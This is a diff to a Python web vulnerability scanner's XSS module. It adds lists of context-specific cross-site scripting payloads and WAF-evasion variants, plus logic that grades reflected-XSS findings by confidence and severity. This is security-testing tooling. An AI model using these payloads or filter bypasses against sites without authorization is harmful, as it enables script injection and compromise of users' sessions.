@@ -219,9 +219,166 @@ class XSSScanner(BaseScanner):
         super().__init__(session, results, debug)
         self.canary_prefix = "wsxss"
 
+        # Context-aware payload sets — tried first before the wordlist
+        self._context_payloads: Dict[str, List[str]] = {
+            "script": [
+                "</script><script>alert(document.domain)</script>",
+                "';alert(document.domain)//",
+                "\";alert(document.domain)//",
+                "`;alert(document.domain)//",
+                "-alert(document.domain)-",
+                "'+alert(document.domain)+'",
+                "\"+alert(document.domain)+\"",
+                "javascript:alert(document.domain)",
+            ],
+            "attr": [
+                "\" onmouseover=\"alert(document.domain)",
+                "' onmouseover='alert(document.domain)",
+                "\" autofocus onfocus=\"alert(document.domain)",
+                "\" onload=\"alert(document.domain)",
+                "\"><img src=x onerror=alert(document.domain)>",
+                "\"><svg onload=alert(document.domain)>",
+                "\" style=\"animation-name:x\" onanimationstart=\"alert(document.domain)",
+            ],
+            "html": [
+                "<script>alert(document.domain)</script>",
+                "<img src=x onerror=alert(document.domain)>",
+                "<svg onload=alert(document.domain)>",
+                "<body onload=alert(document.domain)>",
+                "<details open ontoggle=alert(document.domain)>",
+                "<video src=1 onerror=alert(document.domain)>",
+                "<audio src=1 onerror=alert(document.domain)>",
+                "<iframe srcdoc=\"<script>alert(parent.document.domain)</script>\">",
+                "<input autofocus onfocus=alert(document.domain)>",
+                "<select autofocus onfocus=alert(document.domain)>",
+                "<textarea autofocus onfocus=alert(document.domain)>",
+                "<!--<img src=--><img src=x onerror=alert(document.domain)//>",
+            ],
+            "comment": [
+                "--><script>alert(document.domain)</script>",
+                "--><img src=x onerror=alert(document.domain)>",
+                "--><svg onload=alert(document.domain)>",
+            ],
+            "style": [
+                "}</style><script>alert(document.domain)</script>",
+                "expression(alert(document.domain))",
+                "</style><img src=x onerror=alert(document.domain)>",
+            ],
+            # attr_double / attr_single map to "attr" semantics
+            "attr_double": [
+                "\" onmouseover=\"alert(document.domain)",
+                "\" autofocus onfocus=\"alert(document.domain)",
+                "\" onload=\"alert(document.domain)",
+                "\"><img src=x onerror=alert(document.domain)>",
+                "\"><svg onload=alert(document.domain)>",
+            ],
+            "attr_single": [
+                "' onmouseover='alert(document.domain)",
+                "' autofocus onfocus='alert(document.domain)",
+                "'><img src=x onerror=alert(document.domain)>",
+                "'><svg onload=alert(document.domain)>",
+            ],
+        }
+
+        # WAF bypass payload variants
+        self._waf_bypass_payloads: List[str] = [
+            "<ScRiPt>alert(document.domain)</ScRiPt>",
+            "<SCRIPT>alert(document.domain)</SCRIPT>",
+            "<img src=x OnErRoR=alert(document.domain)>",
+            "<svg/onload=alert(document.domain)>",
+            "<svg\tonload=alert(document.domain)>",
+            "<svg\nonload=alert(document.domain)>",
+            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+            "<img src=x onerror=alert`1`>",
+            "<img src=x onerror=alert(1)//",
+            "<details/open/ontoggle=alert(document.domain)>",
+            "<marquee onstart=alert(document.domain)>",
+            "<isindex type=image src=1 onerror=alert(document.domain)>",
+            "<object data=javascript:alert(document.domain)>",
+            "<embed src=javascript:alert(document.domain)>",
+            "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//\\x3e",
+            "\"><img src=x onerror=alert(document.domain)><\"",
+        ]
+
     def _gen_canary(self) -> str:
         token = "".join(random.choices(string.ascii_letters + string.digits, k=8))
         return f"{self.canary_prefix}{token}"
+
+    def _get_baseline(self, url: str, params: dict) -> Tuple[str, int]:
+        """Orijinal parametrelerle baseline response al."""
+        try:
+            r = self.session.get(url, params=params, timeout=10, allow_redirects=True)
+            return r.text, r.status_code
+        except Exception:
+            return "", 0
+
+    def _verify_xss_reflection(self, response_text: str, payload: str, context: str) -> Dict:
+        """
+        Payload'ın response'da nasıl yansıdığını analiz et.
+        Returns: {"reflected": bool, "encoded": bool, "executable": bool, "confidence": str}
+        """
+        import html as _html
+
+        result: Dict = {
+            "reflected": False,
+            "encoded": False,
+            "executable": False,
+            "confidence": "none",
+        }
+
+        if not payload:
+            return result
+
+        if payload not in response_text:
+            # Entity-encoded reflection kontrolü
+            encoded_form = _html.escape(payload)
+            if encoded_form != payload and encoded_form in response_text:
+                result["reflected"] = True
+                result["encoded"] = True
+                result["confidence"] = "low"  # encoded = sanitized = not exploitable
+            return result
+
+        result["reflected"] = True
+
+        # Payload execute edilebilir mi? Context'e göre kontrol et
+        if context == "script":
+            if any(c in response_text for c in ["alert(", "alert`", "onerror=", "onload="]):
+                result["executable"] = True
+                result["confidence"] = "high"
+            else:
+                result["confidence"] = "medium"
+        elif context in ("html", "comment"):
+            if re.search(
+                r'<\s*(script|img|svg|iframe|object|embed|video|audio|details)',
+                response_text,
+                re.I,
+            ):
+                result["executable"] = True
+                result["confidence"] = "high"
+            elif "<" in response_text and ">" in response_text:
+                result["confidence"] = "medium"
+            else:
+                result["encoded"] = True
+                result["confidence"] = "low"
+        elif context in ("attr", "attr_double", "attr_single"):
+            if re.search(r'on\w+\s*=\s*["\']?alert', response_text, re.I):
+                result["executable"] = True
+                result["confidence"] = "high"
+            elif '"' in response_text or "'" in response_text:
+                result["confidence"] = "medium"
+            else:
+                result["confidence"] = "low"
+        elif context == "style":
+            if re.search(r'(</style>|expression\s*\()', response_text, re.I):
+                result["executable"] = True
+                result["confidence"] = "high"
+            else:
+                result["confidence"] = "medium"
+        else:
+            # Default: reflected but context unknown
+            result["confidence"] = "medium"
+
+        return result
 
     def run(self, url, results: Dict = None, **kwargs):
         if results is not None:
@@ -293,16 +450,30 @@ class XSSScanner(BaseScanner):
                 "'-alert(1)-'",
             ]
 
-        # Context-aware payload selection — prepend the most likely-to-work payloads
-        ctx_payloads = _context_payloads(context)
-        payloads = ctx_payloads + [p for p in list(base_payloads) if p not in ctx_payloads]
+        # Context-aware payload selection — use richer self._context_payloads first,
+        # then fall back to the module-level _CTX_PAYLOADS helper for compatibility.
+        ctx_specific = self._context_payloads.get(context, self._context_payloads.get("html", []))
+        ctx_legacy = _context_payloads(context)
+        ctx_combined = list(ctx_specific)
+        for p in ctx_legacy:
+            if p not in ctx_combined:
+                ctx_combined.append(p)
+
+        # Add WAF bypass payloads after context-specific ones
+        waf_payloads = [p for p in self._waf_bypass_payloads if p not in ctx_combined]
+
+        payloads = ctx_combined + waf_payloads + [
+            p for p in list(base_payloads)
+            if p not in ctx_combined and p not in waf_payloads
+        ]
         payloads = payloads + Mutator.mutate_polyglot("alert(1)")
         if len(payloads) > self.MAX_URL_PAYLOADS:
-            # Always keep the context-specific ones; sample from the rest
-            keep = payloads[:len(ctx_payloads)]
-            rest = random.sample(payloads[len(ctx_payloads):],
-                                 min(self.MAX_URL_PAYLOADS - len(keep),
-                                     len(payloads) - len(ctx_payloads)))
+            # Always keep the context-specific + WAF bypass ones; sample from the rest
+            keep_n = len(ctx_combined) + len(waf_payloads)
+            keep = payloads[:keep_n]
+            rest_pool = payloads[keep_n:]
+            sample_n = min(self.MAX_URL_PAYLOADS - keep_n, len(rest_pool))
+            rest = random.sample(rest_pool, sample_n) if sample_n > 0 else []
             payloads = keep + rest
 
         def probe(payload: str) -> Optional[Dict]:
@@ -324,43 +495,74 @@ class XSSScanner(BaseScanner):
                 logger.warning(f"[XSS] Probe request failed for {invoked}: {exc!r}")
                 return None
 
-            if actual in res.text and actual not in baseline_text:
-                # Guard: check that dangerous chars are reflected RAW (unencoded).
-                # If the application HTML-encodes < > " ' the payload is harmless
-                # in a browser even though it appears in the source — skip it.
-                if not _is_xss_executable(actual, res.text):
-                    return None
-                pos = res.text.find(actual)
-                window = res.text[max(0, pos - 100): pos + len(actual) + 100]
-                has_exec_ctx = bool(
-                    _SCRIPT_INDICATORS.search(window)
-                    or _EVENT_INDICATORS.search(window)
-                    or _HREF_INDICATORS.search(window)
-                    or _SRC_INDICATORS.search(window)
-                )
-                return {
-                    "vuln_type": "Reflected XSS",
-                    "url": url,
-                    "param": param_name,
-                    "payload": actual,
-                    "detection_method": "reflection",
-                    "confidence": "medium" if has_exec_ctx else "low",
-                }
-            return None
+            # Baseline status code comparison: if both baseline and response are 404 -> FP
+            if res.status_code == 404:
+                baseline_status = 0
+                try:
+                    bl = self.session.get(url, timeout=8)
+                    baseline_status = bl.status_code
+                except Exception:
+                    pass
+                if baseline_status == 404:
+                    return None  # both 404 -> false positive
+
+            # Use _verify_xss_reflection for precise reflection analysis
+            reflection = self._verify_xss_reflection(res.text, actual, context)
+
+            if not reflection["reflected"]:
+                return None
+            if reflection["encoded"]:
+                # Encoded = sanitized, not exploitable; skip
+                logger.debug(f"[XSS] Payload encoded in response — skipping: {actual[:50]!r}")
+                return None
+            if reflection["confidence"] == "none":
+                return None
+
+            # Additional check: payload must not be in baseline
+            if actual in baseline_text:
+                return None
+
+            # Legacy executable guard for extra safety
+            if not _is_xss_executable(actual, res.text):
+                return None
+
+            return {
+                "vuln_type": "Reflected XSS",
+                "url": url,
+                "param": param_name,
+                "payload": actual,
+                "detection_method": "reflection",
+                "confidence": reflection["confidence"],
+                "_executable": reflection["executable"],
+            }
 
         hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
         ato_gen = XSSToATOChain()
         for hit in hits:
             dom_confirmed = self._dom_verify_xss(url, param_name, hit.get("payload", ""))
+            hit_confidence = hit.get("confidence", "medium")
+            executable = hit.pop("_executable", False)
+
+            # Severity based on confidence + executability
+            if dom_confirmed:
+                severity = "High"
+            elif hit_confidence == "high" and executable:
+                severity = "High"
+            elif hit_confidence == "medium":
+                severity = "Medium"
+            else:
+                severity = "Low"
+
             self.report_finding(
-                severity="High",
+                severity=severity,
                 evidence=(
                     "Payload yansıtıldı + Playwright ile DOM yürütmesi DOĞRULANDI"
                     if dom_confirmed else
-                    "Payload yansıtıldı (baseline'da yok) — DOM doğrulanamadı, manuel kontrol önerilir"
+                    f"Payload yansıtıldı (confidence={hit_confidence}, executable={executable}) "
+                    "— DOM doğrulanamadı, manuel kontrol önerilir"
                 ),
                 verified=dom_confirmed,
-                confidence="high" if dom_confirmed else hit.get("confidence", "medium"),
+                confidence="high" if dom_confirmed else hit_confidence,
                 detection_method=hit.get("detection_method", "reflection"),
                 **{k: v for k, v in hit.items() if k not in ("confidence", "detection_method")},
             )
@@ -560,34 +762,50 @@ class XSSScanner(BaseScanner):
                 logger.warning(f"[XSS] Form probe failed for {action}: {exc!r}")
                 return None
 
-            if payload in res.text and payload not in baseline_text:
-                if not _is_xss_executable(payload, res.text):
-                    return None
-                pos = res.text.find(payload)
-                window = res.text[max(0, pos - 100): pos + len(payload) + 100]
-                has_exec_ctx = bool(
-                    _SCRIPT_INDICATORS.search(window)
-                    or _EVENT_INDICATORS.search(window)
-                    or _HREF_INDICATORS.search(window)
-                    or _SRC_INDICATORS.search(window)
-                )
-                return {
-                    "vuln_type": "Reflected XSS (Form)",
-                    "url": action,
-                    "param": p_name,
-                    "payload": payload,
-                    "detection_method": "reflection_form",
-                    "confidence": "medium" if has_exec_ctx else "low",
-                }
-            return None
+            if payload in baseline_text:
+                return None
+
+            # Detect reflection context then use strict verification
+            form_context = _detect_reflection_context(res.text, payload)
+            reflection = self._verify_xss_reflection(res.text, payload, form_context)
+
+            if not reflection["reflected"]:
+                return None
+            if reflection["encoded"]:
+                return None
+            if reflection["confidence"] == "none":
+                return None
+            if not _is_xss_executable(payload, res.text):
+                return None
+
+            return {
+                "vuln_type": "Reflected XSS (Form)",
+                "url": action,
+                "param": p_name,
+                "payload": payload,
+                "detection_method": "reflection_form",
+                "confidence": reflection["confidence"],
+                "_executable": reflection["executable"],
+            }
 
         hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
         for hit in hits:
+            executable = hit.pop("_executable", False)
+            hit_confidence = hit.get("confidence", "low")
+            if hit_confidence == "high" and executable:
+                severity = "High"
+            elif hit_confidence == "medium":
+                severity = "Medium"
+            else:
+                severity = "Low"
             self.report_finding(
-                severity="High",
-                evidence="Payload reflected in form response (not in baseline)",
+                severity=severity,
+                evidence=(
+                    f"Payload reflected in form response (confidence={hit_confidence}, "
+                    f"executable={executable})"
+                ),
                 detection_method=hit.get("detection_method", "reflection_form"),
-                confidence=hit.get("confidence", "low"),
+                confidence=hit_confidence,
                 **{k: v for k, v in hit.items() if k not in ("confidence", "detection_method")},
             )
 
